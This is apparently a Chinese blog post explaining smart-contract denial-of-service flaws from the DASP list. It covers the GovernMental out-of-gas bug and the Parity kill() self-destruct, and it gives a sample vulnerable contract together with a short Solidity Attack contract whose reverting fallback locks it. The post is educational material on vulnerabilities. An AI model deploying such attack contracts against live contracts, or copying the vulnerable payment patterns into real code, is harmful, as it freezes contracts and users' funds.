---
title: "#DASP# Denial of Services (5)"
date: 2018-08-09 10:22:50
tags: ["BlockChain", "DASP"]
categories: ["区块链"]
---

## 0x00 Info

在智能合约中，当 *超过gas限制*，*异常抛出*，*非预期的终止合约*，*访问控制被破坏* 均会产生合约拒绝服务问题。
本篇就介绍DASP第五大漏洞--[Denial of Service](https://www.dasp.co/#item-5)

<!-- more -->

## 0x01 Real World Impact

### GovernMental

起因：[GovernMental's 1100 ETH jackpot payout is stuck because it uses too much gas](https://www.reddit.com/r/ethereum/comments/4ghzhv/governmentals_1100_eth_jackpot_payout_is_stuck/)

官网：[GovernMental](http://governmental.github.io/GovernMental/)

源码：[etherscan code](https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3#code)

GovernMental本身是个嘲讽政府[庞氏骗局](https://baike.baidu.com/item/%E5%BA%9E%E6%B0%8F%E9%AA%97%E5%B1%80)的游戏合约，其规则大概为投资者捐最少1ETH给政府，如果政府在最近12小时内没有收到任何捐赠，则将奖金发给最后一名投资人，而如果收到奖励，则按一定比例分别将钱分给资金池、政府及投资人。

其中在大于12小时未收到赞助的逻辑分支中，将奖金分给最后一名投资人后会重置所有投资人：
```solidity
if (lastTimeOfNewCredit + TWELVE_HOURS < block.timestamp) {
    // Return money to sender
    msg.sender.send(amount);
    // Sends all contract money to the last creditor
    creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash);
    corruptElite.send(this.balance);
    // Reset contract state
    lastCreditorPayedOut = 0;
    lastTimeOfNewCredit = block.timestamp;
    profitFromCrash = 0;
    creditorAddresses = new address[](0);    // out of gas!
    creditorAmounts = new uint[](0);         // out of gas!
    round += 1;
    return false;
}
```
以上标注out of gas的两行在底层运行时，代码会循环遍历存储位置并逐个删除，如果creditors过多的话，会消耗大于当前最大gas数量导致合约失效。

[Governmental Attack](http://blockchain.unica.it/projects/ethereum-survey/attacks.html#governmental)：简化版的Governmental及其EXP利用。

### Parity kill()

[Parity Multisig Hacked. Again](https://medium.com/chain-cloud-company-blog/parity-multisig-hack-again-b46771eaa838)

[A Postmortem on the Parity Multi-Sig Library Self-Destruct](https://paritytech.io/a-postmortem-on-the-parity-multi-sig-library-self-destruct/)

这个其实在[#DASP# Access Control (3)](https://houugen.fun/2018/07/24/DASP-Access-Control-3/#more)一篇中已经介绍，还是利用访问控制漏洞接管parity钱包，然后不是取钱还是调用合约中kill函数销毁合约，从而导致任意用户都无法继续使用。
```solidity
// kills the contract sending everything to `_to`.
function kill(address _to) onlymanyowners(sha3(msg.data)) external {
    suicide(_to);
}
```

## 0x02 Example

实例来源于DASP，模仿King of the Ether游戏规则，当你向合约发送比现在price多的eth时，你就可以成为总统，之前的总统会收到当前price的补偿，且当前price翻倍。
而争夺者为一个合约且在fallback函数中恶意抛出异常，则可以破坏游戏规则永远成为总统。

```solidity
contract PresidentOfCountry {
    address public president;
    uint256 public price;

    function PresidentOfCountry(uint256 _price) {
        require(_price > 0);
        price = _price;
        president = msg.sender;
    }

    function becomePresident() payable {
        require(msg.value > price); // must pay the price to become president
        president.transfer(price);   // we pay the previous president
        president = msg.sender;      // we crown the new president
        price = price * 2;           // we double the price to become president
    }
}

contract Attack {
    function () { revert(); }

    function Attack(address _target) payable {
        _target.call.value(msg.value)(bytes4(keccak256("becomePresident()")));
    }
}
```

Attack合约部署后通过构造函数调用PresidentOfCountry合约的`becomePresident()`函数，同时发送大于price的eth，则执行becomePresident逻辑，1. 向之前的账户发送price补偿；2. 自己合约账户变为president；3. price翻倍。

当其他正常账户参与游戏调用becomePresident逻辑时，同样会向attach合约地址（当前president）发送price，正因为当前president不是普通账户还是合约账户，transfer会触发合约中fallback函数，而恶业攻击者在fallback中执行了`revert()`，导致异常，从而无法执行后续变更总统和价格的逻辑。造成合约DOS。
> 可以再remix中模拟上述操作。

## 0x03 Others

除了智能合约，链核心、链节点、区块链相关的网址都会出现DOS。
* EOSIO
    + [EOSIO](https://github.com/EOSIO/eos/issues/3497)
    + [CVE-2018-11548](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11548)
* Bitcoin Core
    + [CVE-2016-10724](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10724)
    + [CVE-2016-10725](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10725)
* BitCoin Web
    + [知名比特币网站bustabit价值$12,000的点击劫持、XSS以及拒绝服务漏洞详情揭秘 ](https://mp.weixin.qq.com/s/ymgchNB7k1apjcA_f5iVFg)
